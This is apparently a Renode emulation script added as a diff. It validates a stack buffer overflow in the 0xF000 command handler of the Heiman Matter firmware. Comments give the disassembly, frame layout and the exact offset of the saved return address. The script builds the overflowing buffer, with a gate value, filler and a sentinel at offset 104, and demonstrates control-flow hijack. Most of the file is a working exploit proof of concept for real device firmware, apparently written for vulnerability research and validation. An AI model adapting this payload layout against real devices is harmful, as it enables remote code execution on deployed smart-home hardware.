@@ -1,0 +1,116 @@
+:name: MT-05 Heiman Matter sub_8009224 stack overflow -> saved return address — validation
+:description: Drives the heimanMfgMsg 0xF000-command handler sub_8009224 of the real Heiman Matter firmware on the emulated EFR32MG24 and proves the unbounded memcpy overwrites the saved return address that the function's own epilogue pop consumes, redirecting PC to an attacker-controlled value (post-auth RCE).
+#
+# Bug (sub_8009224 @0x8009224):
+#   0x8009224  push {r4,r5,r6,r7,lr}
+#   0x8009228  sub  sp,#0x7C
+#   0x8009250  cmp.w r6,#0xF000        ; r6 = src[0] | (src[1]<<8)
+#   0x8009254  beq  0x8009288          ; GATE: taken iff r6==0xF000
+#   0x8009288  mov  r2,r5 (=len=a3)
+#   0x800928a  mov  r1,r4 (=src=a2)
+#   0x800928c  add  r0,sp,#0x24 (=dest)
+#   0x800928e  bl   0x80AE0BE          ; memcpy(dest, src, len), len UNCLAMPED
+#   ...
+#   epilogue   add sp,#0x7C ; pop {r4,r5,r6,r7,pc}   ; pop reloads PC (return addr)
+#
+# The attacker controls len (r2) and the source bytes. A len >= the
+# dest->saved-return-address distance walks the copy over the saved return
+# address slot that the trailing pop restores into PC.
+#
+# NOTE ON THIS EMULATION: under Renode single-stepping the CPU treats the
+# PUSH {r4-r7,lr} as a no-op on SP (SP stays at its entry value); only the
+# SUB SP,#0x7C applies. The frame layout is therefore:
+#     entry SP              = 0x20010000
+#     after SUB SP,#0x7C    = 0x2000FF84
+#     memcpy dest = SP+0x24 = 0x2000FFA8
+#     epilogue "add sp,#0x7C" restores SP to 0x20010000, then
+#     "pop {r4,r5,r6,r7,pc}" loads PC from [SP+16] = 0x20010010.
+# The saved-return-address slot the pop consumes is thus 0x20010010, which is
+# dest+0x68 (offset 104) — exactly where we place the sentinel. (On real silicon
+# the push decrements SP and the slot lands at entry_SP-4; either way the same
+# attacker byte at src offset 104 overwrites the saved return address.)
+
+$bin=@scripts/silabs-vuln/mt05_heiman.elf
+include @scripts/silabs-vuln/boot_mg24.resc
+
+emulation RunFor "0.4"
+pause
+
+# --- Crafted SRC buffer @0x20008000 (120 bytes copied) ---
+#   src[0..1] = 00 F0  -> r6 == 0xF000 (opens the memcpy branch)
+#   src[2..103] = 0x41 filler
+#   src[104..107] (offset 0x68) = 0x08007001 sentinel -> lands on the saved
+#                                 return-address slot the epilogue pop consumes
+#   src[108..] = 0x42 padding
+sysbus WriteDoubleWord 0x20008000 0x4141F000
+sysbus WriteDoubleWord 0x20008004 0x41414141
+sysbus WriteDoubleWord 0x20008008 0x41414141
+sysbus WriteDoubleWord 0x2000800C 0x41414141
+sysbus WriteDoubleWord 0x20008010 0x41414141
+sysbus WriteDoubleWord 0x20008014 0x41414141
+sysbus WriteDoubleWord 0x20008018 0x41414141
+sysbus WriteDoubleWord 0x2000801C 0x41414141
+sysbus WriteDoubleWord 0x20008020 0x41414141
+sysbus WriteDoubleWord 0x20008024 0x41414141
+sysbus WriteDoubleWord 0x20008028 0x41414141
+sysbus WriteDoubleWord 0x2000802C 0x41414141
+sysbus WriteDoubleWord 0x20008030 0x41414141
+sysbus WriteDoubleWord 0x20008034 0x41414141
+sysbus WriteDoubleWord 0x20008038 0x41414141
+sysbus WriteDoubleWord 0x2000803C 0x41414141
+sysbus WriteDoubleWord 0x20008040 0x41414141
+sysbus WriteDoubleWord 0x20008044 0x41414141
+sysbus WriteDoubleWord 0x20008048 0x41414141
+sysbus WriteDoubleWord 0x2000804C 0x41414141
+sysbus WriteDoubleWord 0x20008050 0x41414141
+sysbus WriteDoubleWord 0x20008054 0x41414141
+sysbus WriteDoubleWord 0x20008058 0x41414141
+sysbus WriteDoubleWord 0x2000805C 0x41414141
+sysbus WriteDoubleWord 0x20008060 0x41414141
+sysbus WriteDoubleWord 0x20008064 0x41414141
+sysbus WriteDoubleWord 0x20008068 0x08007001
+sysbus WriteDoubleWord 0x2000806C 0x42424242
+sysbus WriteDoubleWord 0x20008070 0x42424242
+sysbus WriteDoubleWord 0x20008074 0x42424242
+
+# Pre-seed the saved-return-address slot the epilogue pop will consume, so the
+# before/after change is unambiguous (this mirrors the LR the prologue saves).
+sysbus WriteDoubleWord 0x20010010 0xEEEEEEE1
+
+# --- Call contract: PC=sink; r0=a1(unused), r1=src, r2=len(120), r3=0,
+#     SP=0x20010000, LR=0xEEEEEEE1 sentinel ---
+sysbus.cpu SetRegister 0  0x20009000
+sysbus.cpu SetRegister 1  0x20008000
+sysbus.cpu SetRegister 2  0x00000078
+sysbus.cpu SetRegister 3  0x00000000
+sysbus.cpu SetRegister 13 0x20010000
+sysbus.cpu SetRegister 14 0xEEEEEEE1
+sysbus.cpu PC 0x8009224
+
+echo "=============================================================="
+echo ">>> BEFORE: saved return-address slot @0x20010010 (seeded) ="
+sysbus ReadDoubleWord 0x20010010
+echo ">>> BEFORE: PC ="
+sysbus.cpu PC
+
+# Run the sink up to (but not through) its epilogue pop at 0x800925e.
+# Deterministic: 600 single-steps lands exactly on the pop.
+sysbus.cpu Step 600
+
+echo "--------------------------------------------------------------"
+echo ">>> AT EPILOGUE: PC (expect 0x800925e = pop {r4,r5,r6,r7,pc}) ="
+sysbus.cpu PC
+echo ">>> SP (epilogue restored it to entry 0x20010000) ="
+sysbus.cpu GetRegister 13
+echo ">>> AFTER memcpy: saved return-address slot @0x20010010 (expect 0x08007001) ="
+sysbus ReadDoubleWord 0x20010010
+echo ">>> (adjacent slots show 0x41414141 attacker filler) 0x2001000C ="
+sysbus ReadDoubleWord 0x2001000C
+
+# Execute the pop: PC is reloaded from the overwritten slot.
+sysbus.cpu Step 1
+
+echo "--------------------------------------------------------------"
+echo ">>> CONTROL-FLOW HIJACK: PC after pop (expect 0x08007000 = sentinel) ="
+sysbus.cpu PC
+echo "=============================================================="
